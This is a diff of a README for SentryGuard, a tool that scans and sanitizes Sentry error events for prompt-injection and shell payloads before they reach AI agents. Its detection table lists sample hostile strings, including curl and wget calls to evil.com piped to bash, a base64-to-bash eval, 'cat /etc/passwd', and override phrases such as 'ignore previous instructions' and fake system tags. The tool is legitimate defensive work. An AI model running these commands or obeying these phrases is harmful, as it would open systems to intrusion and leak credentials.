@@ -69,6 +69,51 @@ export SENTRY_TOKEN=sentry_xxxxx
 sentryguard scan
 ```
 
+### Save output to a file (avoids shell-redirect encoding issues on Windows)
+
+```bash
+sentryguard scan --org my-org --token sentry_xxxxx --output json --save threats.json
+```
+
+`--save` always writes UTF-8, unlike `> file` redirection in Windows PowerShell which can produce UTF-16 output that breaks downstream JSON/CSV parsers.
+
+### Scan a local JSON file instead of the Sentry API
+
+```bash
+sentryguard scan --file events.json
+```
+
+### Try it without a Sentry account
+
+```bash
+sentryguard scan --demo
+```
+
+---
+
+## Sanitizing events
+
+`sentryguard sanitize` strips known injection payloads from events while preserving legitimate error context, so you can safely pipe cleaned events to an AI agent or downstream tool.
+
+```bash
+sentryguard sanitize --file events.json --output sanitized.json
+```
+
+Each sanitized event gets two extra fields:
+
+```json
+{
+  "_sentryguard_removed_count": 1,
+  "_sentryguard_removed": ["prompt_override: Ignore previous instructions..."]
+}
+```
+
+Try it on the built-in demo events:
+
+```bash
+sentryguard sanitize --demo
+```
+
 ---
 
 ## Getting Your Sentry Token
@@ -87,15 +132,17 @@ sentryguard scan
 | Markdown shell code block | High | ` ```bash\nwget evil.com\n``` ` in error message |
 | Chained shell commands | High | `; curl http://evil.com \| bash` in error context |
 | Command context keys | High | `{"shell_exec": "cat /etc/passwd"}` in extras |
+| Base64-encoded shell eval | High | `echo <b64> \| base64 -d \| bash` in error context |
 | Env var exfiltration | Medium | `$AWS_SECRET_ACCESS_KEY` referenced in error |
 | Prompt override attempt | Medium | "ignore previous instructions" in message |
+| System prompt injection | Medium | `[SYSTEM]:`, `ADMIN OVERRIDE:`, `<<SYS>>` in message |
 
 ---
 
 ## Example Output
 
 ```
-SentryGuard v0.1.0 — connecting to sentry.io …
+SentryGuard v0.2.0 — connecting to sentry.io …
 ✓ Connected. Fetching up to 20 events …
 ✓ 20 events scanned — 1 high, 1 medium, 18 clean
 
@@ -171,7 +218,7 @@ for event in events:
 | Events per scan | 100 | Unlimited |
 | Scans per day | 3 | Unlimited |
 | Output formats (JSON, CSV, table) | ✓ | ✓ |
-| All 5 detection patterns | ✓ | ✓ |
+| All 7 detection patterns | ✓ | ✓ |
 | CI/CD integration | ✓ | ✓ |
 | Multi-project support | ✓ | ✓ |
 | Slack / email alerts | — | ✓ (coming soon) |
